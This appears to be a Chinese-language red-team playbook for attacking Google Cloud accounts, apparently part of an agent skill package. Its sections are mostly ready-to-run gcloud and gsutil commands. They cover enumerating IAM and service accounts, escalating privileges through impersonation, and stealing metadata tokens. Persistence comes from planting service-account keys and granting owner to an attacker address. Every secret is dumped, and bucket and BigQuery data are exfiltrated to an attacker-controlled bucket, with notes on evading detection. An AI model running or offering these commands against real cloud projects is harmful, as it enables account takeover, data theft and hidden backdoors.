# GCP Attack Flow / GCP 红队流程

> 上游入口：`SKILL.md` → 本文档。
> 适用：已拿到 GCP 凭据 —— `gcloud` 用户登录 / Service Account JSON / Workload Identity token / GCE metadata 抓取的 token。
>
> ⚠️ **生态薄弱声明**：相比 AWS / Azure，GCP 红队工具链碎片化、维护更新滞后。本文档保留**手工 gcloud 命令优先**的风格，工具仅作辅助；遇到工具失效请退回原生 CLI。

## 必备工具

```text
□ gcloud CLI       — 官方 CLI（必备）
□ gsutil           — Storage 操作
□ kubectl          — GKE 控制面
□ Prowler          — 错配扫（多云通吃）
□ ScoutSuite       — 资产快照（多云通吃）
□ GCPloit          — GCP IAM privesc 自动化（**维护不活跃，谨慎使用**）
□ hayat            — GCP OSINT 单文件脚本
□ Steampipe (可选) — SQL-on-GCP（仅 Linux/WSL2）
```

`bootstrap-reverse.ps1` 自动覆盖：gcloud / prowler / scoutsuite。**GCPloit / hayat 不打包**（单文件脚本，按需 git clone）。

---

## 0. 凭据准入

```bash
# gcloud 登录
gcloud auth login                                # 用户凭据
gcloud auth activate-service-account --key-file=sa.json   # SA 凭据

# 当前身份
gcloud auth list
gcloud config list
gcloud projects list                             # 可见 project（**不一定 = 有权限**）

# 测试当前身份对某 project 的权限
gcloud projects get-iam-policy <project-id> 2>&1 | head -20
```

| 凭据类型 | 能做什么 |
|---------|---------|
| 用户凭据（gcloud login）| 用户的所有 IAM 角色 |
| Service Account JSON | SA 的所有 IAM 角色（通常窄但深）|
| Workload Identity / GCE MI | 仅在 GCP 内部资源中使用 |

---

## 1. Discovery / 资产 + IAM 盘点 (TA0007)

### 1.1 资产盘点

```bash
# 全 project 列表（注意：account 可见 project ≠ 有权限）
gcloud projects list --format="value(projectId)"

# 单 project 资产
PROJECT="target-project"
gcloud config set project $PROJECT

# 计算实例
gcloud compute instances list
# 容器集群
gcloud container clusters list --format="value(name,location)"
# 函数
gcloud functions list
# Cloud Run
gcloud run services list
# Storage 桶
gsutil ls
# Secret Manager
gcloud secrets list
# IAM SA
gcloud iam service-accounts list
```

### 1.2 IAM 盘点

```bash
# 当前身份对该 project 的权限
gcloud projects get-iam-policy $PROJECT

# 列举所有 SA + 它们的 keys
gcloud iam service-accounts list --format="value(email)" | while read sa; do
  echo "=== $sa ==="
  gcloud iam service-accounts keys list --iam-account=$sa
done

# Org / Folder 级别（如果可见）
gcloud organizations list
gcloud organizations get-iam-policy <org-id>
```

### 1.3 错配扫

```bash
prowler gcp -p $PROJECT
scout gcp --service-account sa.json --report-dir scout-out
```

---

## 2. Privilege Escalation / 提权 (TA0004)

GCP 提权路径多围绕 **service account impersonation** 和 **过权 IAM role**。

### 2.1 经典 IAM privesc 路径

| 路径 | 入口权限 | 提权动作 |
|------|---------|---------|
| `iam.serviceAccounts.actAs` + Compute / Functions | `iam.serviceAccounts.actAs` on a higher-priv SA | 用该 SA 创建 Compute/Function 跑命令 |
| `iam.serviceAccounts.getAccessToken` | 直接换该 SA 的 access token | `gcloud auth print-access-token --impersonate-service-account=target@...` |
| `iam.serviceAccounts.signBlob` / `signJwt` | 自签 JWT 假冒 SA 调 OAuth | 拿到长期身份 |
| `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs` | 用高权 SA 跑 function | 见上 |
| `compute.instances.create` + actAs | 同模式 | 见上 |
| `deploymentmanager.deployments.create` | DM templates 可借助 attached SA 操作 | 间接提权 |
| `cloudbuild.builds.create` | Cloud Build 默认 SA 通常 Editor 级别 | 提交一个跑攻击命令的 build |
| 过权 primitive role：`Editor` ≈ 全 project 写 | 持有 Editor | 创建任意资源 + actAs 默认 SA |
| 过权 predefined role：`compute.admin` | 同 Compute 全控 | actAs SA 跑命令 |

### 2.2 GCPloit（自动化跑路径）

```bash
# 仓库：https://github.com/dxa4481/gcploit
git clone https://github.com/dxa4481/gcploit
cd gcploit
python3 gcploit.py
# 注意：项目维护不活跃，2024 年后部分 API 已变更。退回手工 gcloud 命令更可靠。
```

### 2.3 跨 project 提权

```text
GCP 没有 AWS 那种"跨账号 trust"的强概念，但有：
□ 一个 SA 在多个 project 里被授予 role（grants 配置错）
□ Org-level role：在 org 上有 role 自动继承到所有 project
□ Folder-level role：folder 内 project 共享
□ Workload Identity Federation：external IdP（GitHub Actions / OIDC）冒充 GCP SA
```

---

## 3. Lateral Movement / 跨服务+跨 project (TA0008)

```bash
# Service Account impersonation（GCP 横向核心）
gcloud auth print-access-token \
    --impersonate-service-account=target@project.iam.gserviceaccount.com

# GCE metadata token（在 VM 内，T1552.005）
curl -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# GKE Workload Identity（Pod 内）
# Pod 自动可用 SA token，对应映射的 IAM SA
kubectl get sa <sa-name> -o yaml   # 看 annotation
```

---

## 4. Persistence / 长效后门 (TA0003)

| 技术 | 命令 | OPSEC |
|------|------|-------|
| 创建 SA + key (T1098.001) | `gcloud iam service-accounts create rt; gcloud iam service-accounts keys create k.json --iam-account=rt@...` | SCC 默认告警 SA key 创建 |
| 给现有 SA 加 key | `gcloud iam service-accounts keys create ...` | 隐蔽点 |
| 加自己为 project IAM | `gcloud projects add-iam-policy-binding $PROJECT --member=user:attacker@gmail.com --role=roles/owner` | Cloud Audit 必留痕 |
| Cloud Function with Internal trigger | 部署 function + Pub/Sub 触发器，定时回连 | 隐蔽 |
| Workload Identity Federation 后门 | 加一条 external identity（GitHub OIDC/AWS）= GCP SA | **极隐蔽**，需要 Workload Identity Pool 权限 |

---

## 5. Collection + Exfiltration (TA0009 / TA0010)

```bash
# Collection
# Storage 全桶 sync
gsutil -m cp -r gs://target-bucket /tmp/loot

# Secret Manager dump
gcloud secrets list --format="value(name)" | while read s; do
  echo "=== $s ==="
  gcloud secrets versions access latest --secret=$s
done

# BigQuery 数据集
bq ls
bq extract --destination_format CSV target:dataset.table gs://attacker-bucket/data.csv

# Exfiltration — 同 vendor 桶
gsutil cp -r /tmp/loot gs://attacker-bucket/$(date +%s)/
```

---

## 6. OPSEC / 检测面

```text
□ Cloud Audit Logs（admin activity）默认开，**管理事件不可关**
□ Security Command Center（SCC）：
  - SA key 创建（IAM_KEY_CREATED）
  - 跨 project 异常授权
  - Workload Identity Federation 配置变更
  - 公开 SA key 泄露（GitHub / Pastebin 扫到）
□ VPC Flow Logs：异常对外连接
□ Org Policy：限制 SA key 创建、限制公网 SA、限制 VPC peering 范围
□ 速率：gcloud SDK 默认节流足够；GCPloit 默认并发偏高
```

## 7. 命令速查

| 任务 | 命令 |
|------|------|
| 当前身份 | `gcloud auth list; gcloud config list` |
| 全 project | `gcloud projects list` |
| IAM policy | `gcloud projects get-iam-policy $P` |
| SA 列表 | `gcloud iam service-accounts list` |
| Impersonate | `gcloud auth print-access-token --impersonate-service-account=...` |
| 错配扫 | `prowler gcp -p $P` |
| 资产快照 | `scout gcp --service-account sa.json` |

## 参考

- [HackTricks — GCP Pentesting](https://book.hacktricks.wiki/en/pentesting-cloud/gcp-pentesting/)
- [Rhino Labs — Privilege Escalation in GCP](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [GCPloit](https://github.com/dxa4481/gcploit)（注意活跃度）
- [hayat](https://github.com/DenizParlak/hayat)
- [GCP IAM Privilege Escalation Reference](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- 事前查 `field-journal/_index.md`
